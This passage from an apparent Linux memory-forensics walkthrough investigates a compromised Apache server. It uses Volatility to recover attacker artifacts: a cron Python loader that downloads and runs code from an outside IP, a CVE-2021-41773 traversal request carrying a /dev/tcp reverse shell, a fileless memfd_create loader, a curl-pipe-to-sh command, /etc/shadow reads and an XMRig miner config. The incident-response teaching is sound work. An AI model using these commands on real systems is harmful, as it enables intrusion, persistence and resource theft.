PID     PPID    COMM    ARGS
852     1       cron    /usr/sbin/cron -f -P
28332   852     cron    /usr/sbin/CRON -f -P
28333   28332   sh  /bin/sh -c /usr/bin/run-one /usr/bin/python3 -c 'import requests, subprocess; loader=requests.get("http://18.117.8.128:8000/chattingloosened"); subprocess.run("/usr/bin/python3", input=loader.content)'
28334   28333   run-one /bin/sh -e /usr/bin/run-one /usr/bin/python3 -c import requests, subprocess; loader=requests.get("http://18.117.8.128:8000/chattingloosened"); subprocess.run("/usr/bin/python3", input=loader.content)
28342   28334   flock   flock -xn /root/.cache/run-one/76ae4bd1f3acefe413847c9e7582326a /usr/bin/python3 -c import requests, subprocess; loader=requests.get("http://18.117.8.128:8000/chattingloosened"); subprocess.run("/usr/bin/python3", input=loader.content)
28343   28342   python3 /usr/bin/python3 -c import requests, subprocess; loader=requests.get("http://18.117.8.128:8000/chattingloosened"); subprocess.run("/usr/bin/python3", input=loader.content)
28344   28343   3   smd
28645   1       bash    bash -i
```

PID tree:

```
852 - cron
|-> 28332 - cron
|-> 28333 - full command with python malicious script executed through run-one (run-one is used to run process only once in order not duplicate processes)
|-> 28342 - flock - lock from run-one to run script only once
|-> 28343 - python malicious script executed
|-> 28344 - smd process that was detected earlier
```

`PID 28645` stands out as showing an interactive `bash` session. You should also save Apache processes:

```bash
910     1   httpd   /usr/local/apache2/bin/httpd -k start
916     910 httpd   /usr/local/apache2/bin/httpd -k start
917     910 httpd   /usr/local/apache2/bin/httpd -k start
918     910 httpd   /usr/local/apache2/bin/httpd -k start
919     910 httpd   /usr/local/apache2/bin/httpd -k start
1441    910 httpd   /usr/local/apache2/bin/httpd -k start
```

#### Dump Processes

So, based on the investigation you can create a list of the most interesting processes:

```
- Apache related:
    - 910   1   httpd   /usr/local/apache2/bin/httpd -k start
    - 916   910 httpd   /usr/local/apache2/bin/httpd -k start
    - 917   910 httpd   /usr/local/apache2/bin/httpd -k start
    - 918   910 httpd   /usr/local/apache2/bin/httpd -k start
    - 919   910 httpd   /usr/local/apache2/bin/httpd -k start
    - 1441  910 httpd   /usr/local/apache2/bin/httpd -k start

- Crontab and malicious python process executed:
    - 852   1   cron    /usr/sbin/cron -f -P
    - 28332 852 cron    /usr/sbin/CRON -f -P
    - 28333 28332   sh  /bin/sh -c /usr/bin/run-one /usr/bin/python3 -c 'import requests, subprocess; loader=requests.get("http://18.117.8.128:8000/chattingloosened"); subprocess.run("/usr/bin/python3", input=loader.content)'
    - 28334 28333   run-one /bin/sh -e /usr/bin/run-one /usr/bin/python3 -c import requests, subprocess; loader=requests.get("http://18.117.8.128:8000/chattingloosened"); subprocess.run("/usr/bin/python3", input=loader.content)
    - 28342 28334   flock   flock -xn /root/.cache/run-one/76ae4bd1f3acefe413847c9e7582326a /usr/bin/python3 -c import requests, subprocess; loader=requests.get("http://18.117.8.128:8000/chattingloosened"); subprocess.run("/usr/bin/python3", input=loader.content)
    - 28343 28342   python3 /usr/bin/python3 -c import requests, subprocess; loader=requests.get("http://18.117.8.128:8000/chattingloosened"); subprocess.run("/usr/bin/python3", input=loader.content)
    - 28344 28343   3   smd

- Interactive bash shell executed:
    - 28645 1   bash    bash -i
```

PID list:

```
910 916 917 918 919 1441 852 28332 28333 28334 28342 28343 28344 28645
```

You can dump those processes using the `linux.proc.Maps` Volatility plugin. Dump Apache processes first:

```bash
linuxforensics@ubuntu:~$ python3 ~/tools/volatility3/vol.py -q -f /home/linuxforensics/Desktop/cases/scenario1/web-server-dump linux.proc.Maps --dump --pid 910
linuxforensics@ubuntu:~$ python3 ~/tools/volatility3/vol.py -q -f /home/linuxforensics/Desktop/cases/scenario1/web-server-dump linux.proc.Maps --dump --pid 916
linuxforensics@ubuntu:~$ python3 ~/tools/volatility3/vol.py -q -f /home/linuxforensics/Desktop/cases/scenario1/web-server-dump linux.proc.Maps --dump --pid 917
linuxforensics@ubuntu:~$ python3 ~/tools/volatility3/vol.py -q -f /home/linuxforensics/Desktop/cases/scenario1/web-server-dump linux.proc.Maps --dump --pid 918
linuxforensics@ubuntu:~$ python3 ~/tools/volatility3/vol.py -q -f /home/linuxforensics/Desktop/cases/scenario1/web-server-dump linux.proc.Maps --dump --pid 919
linuxforensics@ubuntu:~$ python3 ~/tools/volatility3/vol.py -q -f /home/linuxforensics/Desktop/cases/scenario1/web-server-dump linux.proc.Maps --dump --pid 1441
```

After, you can dump process maps related with malicious Python scripts:

```bash
linuxforensics@ubuntu:~$ python3 ~/tools/volatility3/vol.py -q -f /home/linuxforensics/Desktop/cases/scenario1/web-server-dump linux.proc.Maps --dump --pid 852 28332 28333 28334 28342 28343 28344 28645

Volatility 3 Framework 2.5.2

PID     Process Start   End     Flags   PgOff   Major   Minor   Inode   File Path       File output

852     cron    0x55576b84e000  0x55576b851000  r--     0x0     253     0       276222  /usr/sbin/cron  pid.852.vma.0x55576b84e000-0x55576b851000.dmp
852     cron    0x55576b851000  0x55576b858000  r-x     0x3000  253     0       276222  /usr/sbin/cron  pid.852.vma.0x55576b851000-0x55576b858000.dmp
852     cron    0x55576b858000  0x55576b85a000  r--     0xa000  253     0       276222  /usr/sbin/cron  pid.852.vma.0x55576b858000-0x55576b85a000.dmp
852     cron    0x55576b85a000  0x55576b85b000  r--     0xb000  253     0       276222  /usr/sbin/cron  pid.852.vma.0x55576b85a000-0x55576b85b000.dmp
852     cron    0x55576b85b000  0x55576b85c000  rw-     0xc000  253     0       276222  /usr/sbin/cron  pid.852.vma.0x55576b85b000-0x55576b85c000.dmp
852     cron    0x55576bef2000  0x55576bf13000  rw-     0x0     0       0       0       [heap]  pid.852.vma.0x55576bef2000-0x55576bf13000.dmp
852     cron    0x7f298eb16000  0x7f298eb1d000  r--     0x0     253     0       295393  /usr/lib/x86_64-linux-gnu/gconv/gconv-modules.cache      pid.852.vma.0x7f298eb16000-0x7f298eb1d000.dmp
852     cron    0x7f298eb1d000  0x7f298ee06000  r--     0x0     253     0       262145  /usr/lib/locale/locale-archive  pid.852.vma.0x7f298eb1d000-0x7f298ee06000.dmp
852     cron    0x7f298ee06000  0x7f298ee09000  rw-     0x0     0       0       0       Anonymous Mapping       pid.852.vma.0x7f298ee06000-0x7f298ee09000.dmp
852     cron    0x7f298ee09000  0x7f298ee0b000  r--     0x0     253     0       273252  /usr/lib/x86_64-linux-gnu/libcap-ng.so.0.0.0     pid.852.vma.0x7f298ee09000-0x7f298ee0b000.dmp
852     cron    0x7f298ee0b000  0x7f298ee0e000  r-x     0x2000  253     0       273252  /usr/lib/x86_64-linux-gnu/libcap-ng.so.0.0.0     pid.852.vma.0x7f298ee0b000-0x7f298ee0e000.dmp
852     cron    0x7f298ee0e000  0x7f298ee0f000  r--     0x5000  253     0       273252  /usr/lib/x86_64-linux-gnu/libcap-ng.so.0.0.0     pid.852.vma.0x7f298ee0e000-0x7f298ee0f000.dmp
852     cron    0x7f298ee0f000  0x7f298ee10000  r--     0x5000  253     0       273252  /usr/lib/x86_64-linux-gnu/libcap-ng.so.0.0.0     pid.852.vma.0x7f298ee0f000-0x7f298ee10000.dmp
852     cron    0x7f298ee10000  0x7f298ee11000  rw-     0x6000  253     0       273252  /usr/lib/x86_64-linux-gnu/libcap-ng.so.0.0.0     pid.852.vma.0x7f298ee10000-0x7f298ee11000.dmp
852     cron    0x7f298ee11000  0x7f298ee13000  rw-     0x0     0       0       0       Anonymous Mapping       pid.852.vma.0x7f298ee11000-0x7f298ee13000.dmp
852     cron    0x7f298ee13000  0x7f298ee15000  r--     0x0     253     0       273417  /usr/lib/x86_64-linux-gnu/libpcre2-8.so.0.10.4   pid.852.vma.0x7f298ee13000-0x7f298ee15000.dmp
<SNIP>
```

#### Apache Process Memory Maps

You can try straightforward checks by grepping IoCs that you already know in dumped processes:

```bash
linuxforensics@ubuntu:~$ grep -r "bash -i" pid.*

Binary file pid.1441.vma.0x7fa7fc0c0000-0x7fa7fc0c6000.dmp matches

Binary file pid.918.vma.0x7fa7fc00c000-0x7fa7fc0c6000.dmp matches
```

You can see 2 memory segments related to Apache processes.

Run `strings` on each of them:

```bash
linuxforensics@ubuntu:~$ strings -a pid.1441.vma.0x7fa7fc0c0000-0x7fa7fc0c6000.dmp

PTTH
PTTH
<SNIP>

HTTP_HOST=192.168.152.225
HTTP_USER_AGENT=curl/7.81.0

<SNIP> 

SERVER_SOFTWARE=Apache/2.4.49 (Unix)

<SNIP> 

REQUEST_URI=/cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/bash
SCRIPT_NAME=/cgi-bin/../../../../../../../bin/bash
text/plain
Sun, 15 Oct 2023 18:48:25 GMT

<SNIP> 

3,e[15/Oct/2023:18:48:25 +0000]
3,ePOST /cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/bash HTTP/1.1
192.168.152.180 - - [15/Oct/2023:18:48:25 +0000] "POST /cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/bash HTTP/1.1" 200 -
HTTP/1.1 200 OK
Date: Sun, 15 Oct 2023 18:48:25 GMT

<SNIP> 
echo Content-Type: text/plain; echo; bash -i >& /dev/tcp/192.168.152.180/21 0>&1; whoami
```

You have already seen similar information in environment variables. Valuable information you can extract from here:

```
- HTTP_USER_AGENT=curl/7.81.0 (request user agent)
- REQUEST_URI=/cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/bash (request URI)
- Server: Apache/2.4.49 (Unix)
- SCRIPT_NAME=/cgi-bin/../../../../../../../bin/bash (script name that indicates directory traversal and RCE execution)
- Date: Sun, 15 Oct 2023 18:48:25 GMT (time of request)
- 192.168.152.180 - - [15/Oct/2023:18:48:25 +0000] "POST /cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/bash HTTP/1.1" 200 - (this is how data is saved in logs)
- echo Content-Type: text/plain; echo; bash -i >& /dev/tcp/192.168.152.180/21 0>&1; whoami (content-type value with interactive bash shell indicator)
```

Next, you can review `PID 918`:

```bash
linuxforensics@ubuntu:~$ strings -a pid.918.vma.0x7fa7fc00c000-0x7fa7fc0c6000.dmp

GIRO
ECCA
<SNIP>

User-Agent
 Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)

<SNIP> 

REQUEST_URI=/cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/bash
SCRIPT_NAME=/cgi-bin/../../../../../../../bin/bash
text/plain
Sun, 15 Oct 2023 18:24:53 GMT
lvPhZ33QEv4
192.168.152.180
u.,e[15/Oct/2023:18:24:53 +0000]
u.,ePOST /cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/bash HTTP/1.1
192.168.152.180 - - [15/Oct/2023:18:24:53 +0000] "POST /cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/bash HTTP/1.1" 200 -
TP/1.1

<SNIP>

/cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/bash
HTTP/1.1 200 OK
Date: Sun, 15 Oct 2023 18:24:53 GMT
Server: Apache/2.4.49 (Unix)
Transfer-Encoding: chunked
Content-Type: text/plain
gth: 88
Content-Type: application/x-www-form-urlencoded
echo Content-Type: text/plain; echo; bash -i >& /dev/tcp/192.168.152.180/21 0>&1; whoami


<SNIP>
```

Valuable information:

```
- Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html) (nmap user agent claiming that nmap was used to scan web application)
- Date: Sun, 15 Oct 2023 18:24:53 GMT
- HTTP_USER_AGENT=curl/7.81.0
- echo Content-Type: text/plain; echo; bash -i >& /dev/tcp/192.168.152.180/21 0>&1; whoami
```

You can check the Apache version for known RCE CVEs and find the CVE that was used by the attacker:

- https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-41773

#### Miner Executable Memory Maps

Next, try to find the remote IP address:

```bash
linuxforensics@ubuntu:~$ grep -r "51.75.64.249" pid.*

Binary file pid.28344.vma.0x7f338be70000-0x7f338c673000.dmp matches
Binary file pid.28344.vma.0x7f338c675000-0x7f338c6c3000.dmp matches
Binary file pid.28344.vma.0x7f338c6c4000-0x7f338c6e3000.dmp matches
Binary file pid.28344.vma.0x7f338c703000-0x7f338c70d000.dmp matches
Binary file pid.28344.vma.0x7fff99342000-0x7fff99363000.dmp matches
Binary file pid.28344.vma.0x8f3000-0xa64000.dmp matches
```

Take a look at the `pid.28344.vma.0x7f338c675000-0x7f338c6c3000.dmp` strings:

```bash
linuxforensics@ubuntu:~$ strings -a pid.28344.vma.0x7f338c675000-0x7f338c6c3000.dmp

4I"6
&O.u
<SNIP>

pool1
daemon1
mining pool1
mining.proxy
pool1
daemon1
mining pool1
mining.proxy
[2023-10-15 18:51:25.068]  net      new job from 51.75.64.249:20128 diff 2030 algo rx/0 height 99612

<SNIP> 

[2023-10-15 18:52:31.487]  net      new job from 51.75.64.249:20128 diff 2160 algo rx/0 height 99613
[2023-10-15 18:50:26.468]  net      new job from 51.75.64.249:20128 diff 2173 algo rx/0 height 99611

<SNIP> 

51.75.64.249
51.75.64.249:20128
slot0
 #17
mining.proxy
170903143737Z
51.75.64.249
21170810143737Z
51.75.64.249

<SNIP> 

[2023-10-15 18:36:04.664]  randomx  dataset ready (466 ms)
Pool1
Daemon1
Mining Pool1
mining.proxy
RAM slot #57
Pool1
Daemon1
Mining Pool1
mining.proxy
RAM slot #58
[2023-10-15 18:36:04.188]  cpu      use argon2 implementation AVX2
[2023-10-15 18:36:04.189]  randomx  not enough memory for RandomX dataset
RAM slot #60

<SNIP>

RAM slot #49
239daadd5c7d0ac097376c7871f787738826eef1c024729eff870e473b970855
[2023-10-15 18:50:09.222]  miner    speed 10s/60s/15m 88.30 95.03 n/a H/s max 103.6 H/s
[2023-10-15 18:51:09.313]  miner    speed 10s/60s/15m 101.3 96.78 97.68 H/s max 103.6 H/s
[2023-10-15 18:52:09.395]  miner    speed 10s/60s/15m 98.72 100.7 97.65 H/s max 103.6 H/s
[2023-10-15 18:49:09.128]  miner    speed 10s/60s/15m 97.05 92.33 n/a H/s max 103.6 H/s
mining.proxy
`gYz3
GXz3
51.75.64.249

<SNIP>

{"id":1,"jsonrpc":"2.0","method":"login","params":{"login":"85DS3ShGZwtFffeQUrDK8Db12qwCcaCHofNcZdjMkjTCfWiRv9WLe4cR2W97eGnRXwBxDhTK7BbbE2Z7t4gjXRz1VLPmhn7","pass":"x","agent":"XMRig/6.19.3 (Linux x86_64) libuv/1.44.2 gcc/12.2.1","algo":["cn/1","cn/2","cn/r","cn/fast","cn/half","cn/xao","cn/rto","cn/rwz","cn/zls","cn/double","cn/ccx","cn-lite/1","cn-heavy/0","cn-heavy/tube","cn-heavy/xhv","cn-pico","cn-pico/tlo","cn/upx2","rx/0","rx/wow","rx/arq","rx/graft","rx/sfx","rx/keva","argon2/chukwa","argon2/chukwav2","argon2/ninja","ghostrider"]}}

<SNIP>

{"id":43,"jsonrpc":"2.0","method":"submit","params":{"id":"4022241","job_id":"4137616","nonce":"4b0a0000","result":"13f88d736d1835e34c396c25bfd8ddf2d0808d38149e597bf3febe5cd54c0a00"}}
19.3 (Linux x86_64) libuv/1.44.2 gcc/12.2.1","algo":["cn/1","cn/2","cn/r","cn/fast","cn/half","cn/xao","cn/rto","cn/rwz","cn/zls","cn/double","cn/ccx","cn-lite/1","cn-heavy/0","cn-heavy/tube","cn-heavy/xhv","cn-pico","cn-pico/tlo","cn/upx2","rx/0","rx/wow","rx/arq","rx/graft","rx/sfx","rx/keva","argon2/chukwa","argon2/chukwav2","argon2/ninja","ghostrider"]}}
```

You can see that a cryptominer is running on the system. Extracted valuable text data:

```
[2023-10-15 18:36:04.664]  randomx  dataset ready (466 ms)

Pool1
Daemon1
Mining Pool1
mining.proxy
RAM slot #57
Pool1
Daemon1
Mining Pool1
mining.proxy
RAM slot #58

[2023-10-15 18:36:04.188]  cpu      use argon2 implementation AVX2
[2023-10-15 18:36:04.189]  randomx  not enough memory for RandomX dataset 239daadd5c7d0ac097376c7871f787738826eef1c024729eff870e473b970855
[2023-10-15 18:50:09.222]  miner    speed 10s/60s/15m 88.30 95.03 n/a H/s max 103.6 H/s
[2023-10-15 18:51:09.313]  miner    speed 10s/60s/15m 101.3 96.78 97.68 H/s max 103.6 H/s
[2023-10-15 18:52:09.395]  miner    speed 10s/60s/15m 98.72 100.7 97.65 H/s max 103.6 H/s
[2023-10-15 18:49:09.128]  miner    speed 10s/60s/15m 97.05 92.33 n/a H/s max 103.6 H/s
```

You can Google "239daadd5c7d0ac097376c7871f787738826eef1c024729eff870e473b970855"  and find that it may be associated with TLS fingerprint:

- https://www.reddit.com/r/MoneroOcean/comments/154p6vb/xmrig_config_for_ghostrider/

Login data extracted:

```json
{"id":1,"jsonrpc":"2.0","method":"login","params":{"login":"85DS3ShGZwtFffeQUrDK8Db12qwCcaCHofNcZdjMkjTCfWiRv9WLe4cR2W97eGnRXwBxDhTK7BbbE2Z7t4gjXRz1VLPmhn7","pass":"x","agent":"XMRig/6.19.3 (Linux x86_64) libuv/1.44.2 gcc/12.2.1","algo":["cn/1","cn/2","cn/r","cn/fast","cn/half","cn/xao","cn/rto","cn/rwz","cn/zls","cn/double","cn/ccx","cn-lite/1","cn-heavy/0","cn-heavy/tube","cn-heavy/xhv","cn-pico","cn-pico/tlo","cn/upx2","rx/0","rx/wow","rx/arq","rx/graft","rx/sfx","rx/keva","argon2/chukwa","argon2/chukwav2","argon2/ninja","ghostrider"]}}

{"id":43,"jsonrpc":"2.0","method":"submit","params":{"id":"4022241","job_id":"4137616","nonce":"4b0a0000","result":"13f88d736d1835e34c396c25bfd8ddf2d0808d38149e597bf3febe5cd54c0a00"}}
```

The agent is identified as `XMRig`, which is the most commonly used crypto mining software by malicious actors on Linux systems. Next, take a look at the `pid.28344.vma.0x8f3000-0xa64000.dmp` strings:

```bash
linuxforensics@ubuntu:~$ strings -a pid.28344.vma.0x8f3000-0xa64000.dmp
```

From those strings, you can extract `XMRig config`:

```json
"api": {
    "id": null,
    "worker-id": null
},

"http": {
    "enabled": false,
    "host": "127.0.0.1",
    "port": 0,
    "access-token": null,
    "restricted": true
},

"autosave": true,
"background": false,
"colors": true,
"title": true,

"randomx": {
    "init": -1,
    "init-avx2": -1,
    "mode": "auto",
    "1gb-pages": false,
    "rdmsr": true,
    "wrmsr": true,
    "cache_qos": false,
    "numa": true,
    "scratchpad_prefetch_mode": 1
},

"cpu": {
    "enabled": true,
    "huge-pages": true,
    "huge-pages-jit": false,
    "hw-aes": null,
    "priority": null,
    "memory-pool": false,
    "yield": true,
    "max-threads-hint": 100,
    "asm": true,
    "argon2-impl": null,
    "cn/0": false,
    "cn-lite/0": false
},

"opencl": {
    "enabled": false,
    "cache": true,
    "loader": null,
    "platform": "AMD",
    "adl": true,
    "cn/0": false,
    "cn-lite/0": false
},

"cuda": {
    "enabled": false,
    "loader": null,
    "nvml": true,
    "cn/0": false,
    "cn-lite/0": false
},

"donate-level": 0,
"donate-over-proxy": 0,
"log-file": null,

"pools": [
    {
    "algo": null,
    "coin": null,
    "url": "51.75.64.249:20128",
    "user": "85DS3ShGZwtFffeQUrDK8Db12qwCcaCHofNcZdjMkjTCfWiRv9WLe4cR2W97eGnRXwBxDhTK7BbbE2Z7t4gjXRz1VLPmhn7",
    "pass": "x",
    "rig-id": null,
    "nicehash": false,
    "keepalive": false,
    "enabled": true,
    "tls": true,
    "tls-fingerprint": null,
    "daemon": false,
    "socks5": null,
    "self-select": null,
    "submit-to-origin": false
    }
],

"print-time": 60,
"health-print-time": 60,
"dmi": true,
"retries": 5,
"retry-pause": 5,
"syslog": false,
"tls": {
    "enabled": false,
    "protocols": null,
    "cert": null,
    "cert_key": null,
    "ciphers": null,
    "ciphersuites": null,
    "dhparam": null
},

"user-agent": null,
"verbose": 0,
"watch": true,
"pause-on-battery": false,
"pause-on-active": false
```

#### Python Script Memory Maps

Python scripts normally contains `import` information. Grep it:

```bash
linuxforensics@ubuntu:~$ grep -Prao "import [a-zA-Z]+," pid.*

pid.28333.vma.0x560fa29e3000-0x560fa2a04000.dmp:import requests,
pid.28333.vma.0x560fa29e3000-0x560fa2a04000.dmp:import requests,
pid.28333.vma.0x7ffcda40f000-0x7ffcda430000.dmp:import requests,
pid.28334.vma.0x556ea9abd000-0x556ea9ade000.dmp:import requests,
pid.28334.vma.0x556ea9abd000-0x556ea9ade000.dmp:import requests,
pid.28334.vma.0x7ffdd1469000-0x7ffdd148a000.dmp:import requests,
pid.28342.vma.0x7ffd0f970000-0x7ffd0f991000.dmp:import requests,
pid.28343.vma.0x7f2e104b3000-0x7f2e10b18000.dmp:import ctypes,
pid.28343.vma.0x7ffd6d21c000-0x7ffd6d23d000.dmp:import requests,
pid.852.vma.0x55576bef2000-0x55576bf13000.dmp:import requests,
pid.852.vma.0x7ffd867d0000-0x7ffd867f1000.dmp:import requests,
pid.852.vma.0x7ffd867d0000-0x7ffd867f1000.dmp:import requests,
```

It looks like `pid.28343.vma.0x7f2e104b3000-0x7f2e10b18000.dmp` is the file that you are looking for:

```bash
linuxforensics@ubuntu:~$ strings -a pid.28343.vma.0x7f2e104b3000-0x7f2e10b18000.dmp | head -n 4

import ctypes, os, base64, zlib
l = ctypes.CDLL(None)
s = l.syscall
c = base64.b64decode(
```

Save script content to `malicious_script.py`:

```bash
linuxforensics@ubuntu:~$ strings -a pid.28343.vma.0x7f2e104b3000-0x7f2e10b18000.dmp | head -n 12 > malicious_script.py
```

Malicious script content:

```
l = ctypes.CDLL(None)
s = l.syscall
c = base64.b64decode(
b'eNrsvXlcVOX3OH4HGBZFZ3CLzIUSCzINShNKFBD0koPivp…5m/H/QcbsbeM8bxf/RaNP13PdiPjsKUl2QmO21fKY/uZRdf1TDq1j1Zpv+6odIv2KuyzvLT//wciuKnC'
e = zlib.decompress(c)
f = s(319, '', 1)
os.write(f, e)
print(f)
p = '/proc/self/fd/%d' % f
os.execle(p, 'smd', {})
```

After decompressing the base64-encoded text, malware invokes syscall number 319 with arguments that match [memfd_create](https://man7.org/linux/man-pages/man2/memfd_create.2.html) and executes it with the process name `smd`.

The memory file descriptor, [memfd](https://man7.org/linux/man-pages/man2/memfd_create.2.html), is a Linux feature that allows the creation of anonymous memory backed file objects that can be used for various purposes, such as inter-process communication or tempory storage. Threat actors sometimes abuse this Linux feature to execute payloads without writing them to disk, and thus avoid traditional security tools that rely on basic binary scans. Once the payload is placed within memory section created via `memfd`, attackers can invoke one of the exec syscalls on that memory content, treating it as if it were a regular file on disk, and thereby launch a new process.

Live processes executed from `memfd` can be identified on an up-and-running workload by inspecting the symbolic link of `/proc/<pid>/exe`, which begins with the `/memfd:` prefix.

### Bash History and Crontab

Bash history keeps a log of commands you've typed into the shell. This log helps to navigate previous actions quickly using arrow keys or commands like `history`, and it's stored both in memory and on disk. From a security standpoint, this persistence is a double-edged sword. On the one hand, it's great for auditing user activity, but it can be risky if the history file contains confidential or critical data.

#### In-Memory Storage

During an active Bash session, commands are held in RAM. This allows instant access via up/down arrows or for reverse search. The in-memory list is limited by the `HISTSIZE` environment variable, which often holds 500 or 1000 commands by default.

#### On-Disk Storage

When you exit the shell, the session's history is appended to the `~/.bash_history` file, which is typically stored in the home directory of the corresponding user. Its file size is controlled by `HISTFILESIZE` and ensures that older commands are overwritten if the limit is exceeded.

#### Bash History Config

Bash history can be configured either in the `~/.bashrc` or in the `/etc/bash.bashrc` by setting the following environment variables:

| **Variable**                               | **Description**                                                      |
| ------------------------------------------ | -------------------------------------------------------------------- |
| `export HISTSIZE=1000`                     | In-memory limit: 1000 commands per session                           |
| `export HISTFILESIZE=2000`                 | On-disk limit: 2000 lines in `~/.bash_history`                       |
| `export HISTCONTROL=ignoreboth`            | Ignore duplicates and commands starting with space                   |
| `export HISTIGNORE="ls:cd:pwd:exit:clear"` | Ignore common non-sensitive commands                                 |
| `export HISTTIMEFORMAT="%F %T "`           | Timestamp format before the command: `YYYY-MM-DD HH:MM:SS <command>` |
| `export HISTFILE=~/.secure_history`        | Custom path. The file must be created first if it doesn't exist.     |

#### Bash History Review

You can utilize the `linux.bash.Bash` plugin to extract the bash history from the memory dump:

```bash
linuxforensics@ubuntu:~$ python3 ~/tools/volatility3/vol.py -q -f /home/linuxforensics/Desktop/cases/scenario1/web-server-dump linux.bash.Bash

Volatility 3 Framework 2.5.2

PID     Process CommandTime     Command

1282    bash    2023-10-15 17:34:47.000000      history
1282    bash    2023-10-15 17:34:47.000000       ls
1282    bash    2023-10-15 17:34:47.000000      sudo reboot
1282    bash    2023-10-15 17:34:47.000000      rm -rf ~/.bash_history
1282    bash    2023-10-15 18:39:49.000000      sudo mkdir /media/USB
1282    bash    2023-10-15 18:40:25.000000      df -h
1282    bash    2023-10-15 18:44:59.000000      sudo mount -t ext4 /dev/sdb /media/USB -o uid=1000
1282    bash    2023-10-15 18:45:31.000000      sudo lsblk
1282    bash    2023-10-15 18:49:29.000000      sudo fdisk -l
1282    bash    2023-10-15 18:49:47.000000      sudo mount -t ext4 /dev/sdb1 /media/USB -o uid=1000
1282    bash    2023-10-15 18:50:34.000000      sudo mount -t ext4 /dev/sdb1 /media/USB -o uid=1000,gid=1000
1282    bash    2023-10-15 18:51:13.000000      mount /dev/sdb1 /media/USB/
1282    bash    2023-10-15 18:51:16.000000      sudo mount /dev/sdb1 /media/USB/
1282    bash    2023-10-15 18:51:40.000000      ls -la
1282    bash    2023-10-15 18:51:56.000000      ./avml web-server-dump
28645   bash    2023-10-15 18:48:25.000000      curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh
28645   bash    2023-10-15 18:48:25.000000      exit
28645   bash    2023-10-15 18:48:25.000000      �5~�EV
28645   bash    2023-10-15 18:48:25.000000      sudo fdisk -l
28645   bash    2023-10-15 18:48:25.000000      cd /tmp
28645   bash    2023-10-15 18:48:25.000000      find / -perm -u=s -type f 2>/dev/null
28645   bash    2023-10-15 18:48:25.000000      sudo mkdir /media/USB
28645   bash    2023-10-15 18:48:25.000000      vim /etc/sudoers
28645   bash    2023-10-15 18:48:25.000000      sudo bash
28645   bash    2023-10-15 18:48:25.000000      sudo bash
28645   bash    2023-10-15 18:48:25.000000      sudo mount -t ext4 /dev/sdb1 /media/USB -o uid=1000
28645   bash    2023-10-15 18:48:25.000000      history
28645   bash    2023-10-15 18:48:25.000000      ��UH��HH��t�z���H��]�q������U1����������]�����f.�
28645   bash    2023-10-15 18:48:25.000000      ����������������
28645   bash    2023-10-15 18:48:25.000000      ��AWAVAUATUSH�H��T
28645   bash    2023-10-15 18:48:25.000000      ls -la
28645   bash    2023-10-15 18:48:25.000000      whoami
28645   bash    2023-10-15 18:48:25.000000      cd ~
28645   bash    2023-10-15 18:48:25.000000      sudo lsblk
28645   bash    2023-10-15 18:48:25.000000      sudo lsblk
28645   bash    2023-10-15 18:48:25.000000      sudo mount -t ext4 /dev/sdb /media/USB -o uid=1000
28645   bash    2023-10-15 18:48:25.000000      ��H���
28645   bash    2023-10-15 18:48:25.000000      ls -la
28645   bash    2023-10-15 18:48:25.000000      sudo reboot
28645   bash    2023-10-15 18:48:25.000000      ls
28645   bash    2023-10-15 18:48:25.000000      df -h
28645   bash    2023-10-15 18:48:25.000000      cat /etc/passwd
28645   bash    2023-10-15 18:48:25.000000      ls -la
28645   bash    2023-10-15 18:48:25.000000       ls
28645   bash    2023-10-15 18:48:25.000000      cat flag.txt
28645   bash    2023-10-15 18:48:25.000000      pwd
28645   bash    2023-10-15 18:48:25.000000      rm flag.txt
28645   bash    2023-10-15 18:48:25.000000      sudo lsblk
28645   bash    2023-10-15 18:48:25.000000      /etc/bash_completion.d/apport_completion
28645   bash    2023-10-15 18:48:25.000000      sudo fdisk -l | less
28645   bash    2023-10-15 18:48:25.000000      rm -rf ~/.bash_history
28645   bash    2023-10-15 18:48:25.000000      cat /etc/shadow
28645   bash    2023-10-15 18:48:25.000000      sudo fdisk -l | less
28645   bash    2023-10-15 18:48:25.000000      sudo cat /etc/shadow
```

From the bash history extracted from the memory dump, it's evident that the entries at 18:45:25 include suspicious and malicious actions.

Filtering by time:

```bash
linuxforensics@ubuntu:~$ python3 ~/tools/volatility3/vol.py -q -f /home/linuxforensics/Desktop/cases/scenario1/web-server-dump linux.bash.Bash | grep "18:48:25"

28645   bash    2023-10-15 18:48:25.000000      curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh
28645   bash    2023-10-15 18:48:25.000000      exit
28645   bash    2023-10-15 18:48:25.000000      �5~�EV
28645   bash    2023-10-15 18:48:25.000000      sudo fdisk -l
28645   bash    2023-10-15 18:48:25.000000      cd /tmp
28645   bash    2023-10-15 18:48:25.000000      find / -perm -u=s -type f 2>/dev/null
28645   bash    2023-10-15 18:48:25.000000      sudo mkdir /media/USB
28645   bash    2023-10-15 18:48:25.000000      vim /etc/sudoers
28645   bash    2023-10-15 18:48:25.000000      sudo bash
28645   bash    2023-10-15 18:48:25.000000      sudo bash
28645   bash    2023-10-15 18:48:25.000000      sudo mount -t ext4 /dev/sdb1 /media/USB -o uid=1000
28645   bash    2023-10-15 18:48:25.000000      history
28645   bash    2023-10-15 18:48:25.000000      ��UH��HH��t�z���H��]�q������U1����������]�����f.�
28645   bash    2023-10-15 18:48:25.000000      ����������������
28645   bash    2023-10-15 18:48:25.000000      ��AWAVAUATUSH�H��T
28645   bash    2023-10-15 18:48:25.000000      ls -la
28645   bash    2023-10-15 18:48:25.000000      whoami
28645   bash    2023-10-15 18:48:25.000000      cd ~
28645   bash    2023-10-15 18:48:25.000000      sudo lsblk
28645   bash    2023-10-15 18:48:25.000000      sudo lsblk
